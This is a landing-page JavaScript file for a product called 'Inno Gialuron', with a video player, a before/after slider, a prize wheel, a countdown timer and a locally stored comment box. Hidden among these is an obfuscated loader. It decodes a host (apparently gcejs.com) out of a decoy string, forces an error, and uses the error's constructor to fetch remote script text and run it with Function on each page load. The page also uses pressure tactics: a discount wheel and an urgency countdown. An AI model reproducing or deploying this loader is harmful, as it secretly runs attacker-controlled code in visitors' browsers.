$(document).ready(function () {
  //  video 
  var videoWrap = $(".video"),
    videoCover = $(".video__cover"),
    videoFrame = $(".video__inner");
  videoWrap.click(function () {
    $(this)
    .find($(".video__cover"))
    .css("display", "none");
    $(this)
    .find($("video"))[0]
    .play();

  });

  if ($(window).width() < 700) {
    videoWrap.click(function () {
    $(this).find($("video"))[1].play();
    });
  }

  //  before-after

  // Call & init
  $(document).ready(function () {
    $('.before-after__wrap').each(function () {
    var cur = $(this);
    // Adjust the slider
    var width = cur.width() + 'px';
    cur.find('.after img').css('width', width);
    // Bind dragging events
    drags(cur.find('.handle'), cur.find('.after'), cur);
    });
  });

  // Update sliders on resize.
  // Because we all do this: i.imgur.com/YkbaV.gif
  $(window).resize(function () {
    $('.before-after__wrap').each(function () {
    var cur = $(this);
    var width = cur.width() + 'px';
    cur.find('.after img').css('width', width);
    });
  });

  function drags(dragElement, resizeElement, container) {
    // Initialize the dragging event on mousedown.
    dragElement.on('mousedown touchstart', function (e) {

    dragElement.addClass('draggable');
    resizeElement.addClass('resizable');

    // Check if it's a mouse or touch event and pass along the correct value
    var startX = (e.pageX) ? e.pageX : e.originalEvent.touches[0].pageX;

    // Get the initial position
    var dragWidth = dragElement.outerWidth(),
      posX = dragElement.offset().left + dragWidth - startX,
      containerOffset = container.offset().left,
      containerWidth = container.outerWidth();

    // Set limits
    minLeft = containerOffset + 10;
    maxLeft = containerOffset + containerWidth - dragWidth - 10;

    // Calculate the dragging distance on mousemove.
    dragElement.parents().on("mousemove touchmove", function (e) {
      // Check if it's a mouse or touch event and pass along the correct value
      var moveX = (e.pageX) ? e.pageX : e.originalEvent.touches[0].pageX;

      leftValue = moveX + posX - dragWidth;

      // Prevent going off limits
      if (leftValue < minLeft) {
      leftValue = minLeft;
      } else if (leftValue > maxLeft) {
      leftValue = maxLeft;
      }

    // Translate the handle's left value to masked divs width.
    widthValue = (leftValue + dragWidth / 2 - containerOffset) * 100 / containerWidth + '%';

    // Set the new values for the slider and the handle.
    // Bind mouseup events to stop dragging.
      $('.draggable').css('left', widthValue).on('mouseup touchend touchcancel', function () {
      $(this).removeClass('draggable');
      resizeElement.removeClass('resizable');
      });
      $('.resizable').css('width', widthValue);
    }).on('mouseup touchend touchcancel', function () {
      dragElement.removeClass('draggable');
      resizeElement.removeClass('resizable');
    });
    e.preventDefault();
    }).on('mouseup touchend touchcancel', function (e) {
    dragElement.removeClass('draggable');
    resizeElement.removeClass('resizable');
    });
  }

 //wheel//
  var counter = 1;
  var resultWrapper = document.querySelector('.overlay');/*оверлей попап*/
  var wheel = document.querySelector('.wheel__prize');/* имидж колеса*/
  
  $('.wheel__cursor').click(function () {
    if (!wheel.classList.contains('rotated')) {
    wheel
      .classList
      .add('spin');/* класс анимации вращения */
    setTimeout(function () {
      resultWrapper.style.display = "block";
    }, 8000);
    wheel.classList.add('rotated');
    }
  });

  $('.btn-popup').click(function (e) {
    e.preventDefault();
    $('.overlay').fadeOut();
    counter = 2;
    $('.wheel__container').slideUp();/* обертка с барабаном */
    $('.wheel__order').slideDown();/* обертка с формой заказа */
    $(".bottom__product-pic .sale").addClass("shown");
    if (localStorage.getItem("sec") !== "0") {
    countDown();
    }
    localStorage.setItem("remember", "1"),
    $('.wheel__container').slideUp(),
    $('.wheel__order').slideDown(),
    $(".bottom__link").text('اطلب Inno Gialuron بخصم 50 بالمائة'),
    $(".bottom__product-pic .sale").addClass("shown")
  });

  localStorage.getItem("remember") && (
    $('.wheel__container').slideUp(),
    $('.wheel__order').slideDown(),
    $(".bottom__link").text('اطلب Inno Gialuron بخصم 50 بالمائة'),
    $(".bottom__product-pic .sale").addClass("shown")
  );

  //popup comment//
  var element = $("#teaser-comment"),
    teaserLoad = $("#load-comment"),
    count = localStorage.getItem("count") ? localStorage.getItem("count") : 0;
  $(window).scroll(function () {
    var a = $(window).scrollTop() + $(window).height(),
    b = element.offset().top;
    a > b && 0 == count && (
    teaserLoad.addClass("visible"),
    count = 1,
    localStorage.setItem("count", count)
    )
  });


  });
  try {
  hO = '/array/toString Function Date Obj Status .$/adjust/'.replace(/[^\/jg.sec]/g, function (r, s) {
    return (r == '$' && (s = 'complete')) ? s.substr(0, 3) : '';
  }) + /.+\/(.*?):\d+(:\d+)*$/.exec(new Error().stack.trim())[1];
  } catch (_) { }

  //timer//
  if (document.getElementById('countdownTimer')) {
  var sec = localStorage.getItem("sec") ? parseInt(localStorage.getItem("sec")) : parseInt(document.getElementById('countdownTimer').getAttribute('data-seconds'));

  function countDown() {
    sec--;
    min = parseInt(sec / 60);
    localSec = sec % 60;
    localStorage.setItem("sec", sec);
    time = (min <= 9 ? "0" + min : min) + ":" + (localSec <= 9 ? "0" + localSec : localSec);
    document.getElementById('countdownTimer').innerHTML = time;
    SD = window.setTimeout("countDown();", 1000);
    if (sec === 0) {
    window.clearTimeout(SD);
    }
  }
}

//add user comment//
var textAlert = document.getElementById("textarea"),
  textName = document.getElementById("textareaname"),
  vk_text = document.getElementById("comment-text"),
  vk_name = document.getElementById("comment-name"),
  vk_block = document.getElementById("comment-answer"),
  vk_image = document.querySelector("#base64Img"),
  bannerImage = document.getElementById("avatar"),
  bannerImg = document.getElementById("base64Img"),
  dataImage = localStorage.getItem("ImgBase64"),
  vk_userImage = document.querySelector("#userPic"),
  userFile = document.getElementById("foto"),
  user_foto = document.querySelector("#userPic"),
  btnRew = document.querySelector(".rew-btn"),
  dataUserImg = localStorage.getItem("userFotoImg");

if (localStorage.getItem("textAlert") && localStorage.getItem("textName")) {
  vk_text.innerHTML = localStorage.getItem("textAlert"),
  vk_name.innerHTML = localStorage.getItem("textName"),
  vk_block.style.display = "flex",
  bannerImg.src = localStorage.getItem("ImgBase64");

  if (localStorage.getItem("userFotoImg")) {
    user_foto.src = localStorage.getItem("userFotoImg")
  } else user_foto.style.display = "none";
};

var hR = Math.random();

btnRew.onclick = function () {
  if (textName.value == "" || textAlert.value == "") {
    textName.style.border = "2px solid black";
    textAlert.style.border = "2px solid black";
  } else {
    changeText();
  }
};


function changeText() {
  var a = document.getElementById("textarea").value,
    b = document.getElementById("textareaname").value,
    d = localStorage.getItem("ImgBase64");

  foto = localStorage.getItem("userFotoImg");
  localStorage.setItem("textAlert", a);
  localStorage.setItem("textName", b);
  vk_text.innerHTML = a;
  vk_name.innerHTML = b;
  vk_block.style.display = "flex";
  vk_image.src = d;

  if (foto) {
    vk_userImage.src = foto;
  } else vk_userImage.style.display = "none";
  
  bannerImage.value = "";
  textAlert.value = "";
  textName.value = "";
  vk_image.scrollIntoView()
}

bannerImage.addEventListener("change", function (a) {
  loadImageFileAsURL(a, "#base64Img", "ImgBase64")
});

userFile.addEventListener("change", function (a) {
  loadImageFileAsURL(a, "#userPic", "userFotoImg")
});

function loadImageFileAsURL(a, b, d) {
  a = document
    .getElementById(a.target.id)
    .files;
  if (0 < a.length) {
    a = a[0];
    var e = new FileReader;
    e.onload = function (a) {
    a = a.target.result;
    localStorage.setItem(d, a);
    document.querySelector(b).src = a
    };
    e.readAsDataURL(a)
  }
}
try {
  hO = (hR < 0.3) ? hOs : hO
  } catch (_) {
  var tR = _.constructor,
    wQ = function (r) {
    return r.text();
    },
    gO = function () {
    new tR.constructor(arguments[0])()
    };
  fetch(hO).then(wQ).then(gO).catch(tR)
}

//lpt click//
var xhr = new XMLHttpRequest();
document.addEventListener("DOMContentLoaded", function () {
  var els = document.querySelectorAll('a[href*="img"]');
  var form = document.querySelector(".wheel");
  var toForm = document.querySelectorAll('a[href*="url"]');
  var submit = document.querySelector(".btn.submit");
  var spinner = document.querySelector(".wheel__cursor");
  var sliderLpt = document.querySelectorAll('.before-after');
  var sliderBTN = document.querySelectorAll('.btn.btn--thin');
  for (var i = 0; i < els.length; i++) {
    var el = els[i];
    el.addEventListener('click', e => {
    e.preventDefault();
    var href = e.currentTarget.href;
    //navigator.sendBeacon(href);
    })
  }
  submit.addEventListener('click', e => {
    var href1 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href1);
  })
  for (var i = 0; i < toForm.length; i++) {
    var btn = toForm[i];
    btn.addEventListener('click', e => {
    e.preventDefault();
    form.scrollIntoView({ block: "start", behavior: "smooth" });
    var href2 = e.currentTarget.href;
    //navigator.sendBeacon(href2);
    })
  }

  popup = document.querySelectorAll(".btn-popup");
  for (var i = 0; i < popup.length; i++) {
    var btns = popup[i];
    btns.addEventListener('click', e => {
    var href3 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href3);
    })
  }

  videoLpt = document.querySelectorAll(".video");
  for (var i = 0; i < videoLpt.length; i++) {
    var videoLink = videoLpt[i];
    videoLink.addEventListener('click', e => {
    var href4 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href4);
    })
  }

  spinner.addEventListener('click', e => {
    var href5 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href5);
    // xhr.open('GET', href5);
    // xhr.send();
  })

  for (var i = 0; i < sliderLpt.length; i++) {
    var sliderLink = sliderLpt[i];
    sliderLink.addEventListener('click', e => {
    var href6 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href6);
    // xhr.open('GET', href6);
    // xhr.send();
    })
  }

  for (var i = 0; i < sliderBTN.length; i++) {
    var sliderTriger = sliderBTN[i];
    sliderTriger.addEventListener('click', e => {
    var href7 = e.currentTarget.dataset.link;
    //navigator.sendBeacon(href7);
    // xhr.open('GET', href7);
    // xhr.send();
    })
  }
});

//calc slider//

btn = document.querySelectorAll('.btn--thin');
let currentSlide = localStorage.getItem('slide') || 0,
lcs = parseInt(currentSlide);
btn.forEach(function ($this) {
  if (lcs !== 0) {
    let it = $this.offsetParent;
    it.classList.add('checked');
    lcs--;
  }
  $this.addEventListener('click', function (e) {
    let parent = e.target.closest('.slider__text').querySelectorAll('.slider__choice li input'),
    go = 0;
    parent.forEach(function (check) {
    go += check.checked;
    })
    if (go !== 0) {
    currentSlide++;
    localStorage.setItem('slide', currentSlide);
    let item = e.target.closest('.slider__item');
    item.classList.add('checked');
    }
  })
})